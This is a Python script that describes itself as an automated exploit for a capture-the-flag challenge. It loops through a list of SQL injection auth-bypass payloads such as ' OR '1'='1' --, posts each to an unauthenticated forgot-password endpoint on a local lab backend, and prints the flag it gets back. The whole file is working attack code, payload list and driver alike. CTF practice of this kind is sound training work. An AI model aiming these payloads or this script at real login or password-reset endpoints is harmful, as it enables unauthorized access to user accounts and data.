#!/usr/bin/env python3
"""
Automated exploit for the SQL Injection via Forgot Password CTF challenge.

Vulnerability: POST /auth/forgot-password
  The server interpolates the user-supplied ``email`` field directly into a
  raw SQL query without parameterization.  Supplying a classic auth-bypass
  payload causes the WHERE clause to match the first row in the users table.
  The server detects the manipulation and returns the flag in the JSON response.

No authentication is required to exploit this challenge.
"""

import argparse
import sys
import requests


# ---------------------------------------------------------------------------
# Payloads to try in order
# ---------------------------------------------------------------------------
PAYLOADS = [
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 'a'='a' --",
    "x' OR '1'='1",
]


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

def exploit(base_url: str) -> str | None:
    """
    Iterate through SQLi payloads until the server returns a ``flag`` key.
    Returns the flag string on success, None if all payloads fail.
    """
    url = f"{base_url}/auth/forgot-password"
    print(f"[*] Target: {url}")

    for payload in PAYLOADS:
        print(f"[*] Trying payload: {payload!r}")
        try:
            resp = requests.post(
                url,
                json={"email": payload},
                timeout=10,
            )
        except requests.RequestException as exc:
            print(f"[-] Request failed: {exc}")
            sys.exit(1)

        if resp.status_code not in (200, 201):
            print(f"[!] Unexpected status {resp.status_code}: {resp.text[:200]}")
            continue

        data = resp.json()
        flag = data.get("flag")
        if flag:
            return flag

        print(f"    → no flag in response (message: {data.get('message', '')!r})")

    return None


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="SQL Injection exploit — POST /auth/forgot-password\n"
                    "No login required; challenge is in the unauthenticated endpoint.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    # --email and --password are accepted for CLI shape consistency but not used
    parser.add_argument("--email",    default="",                        help="(unused — no auth required)")
    parser.add_argument("--password", default="",                        help="(unused — no auth required)")
    parser.add_argument("--url",      default="http://localhost:8001",   help="Backend base URL")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")

    flag = exploit(base_url)
    if flag:
        print(f"[+] Flag: {flag}")
        sys.exit(0)
    else:
        print("[-] Exploit failed — no flag returned for any payload.")
        print("    Make sure the backend is running and flags.yml is configured.")
        sys.exit(1)


if __name__ == "__main__":
    main()
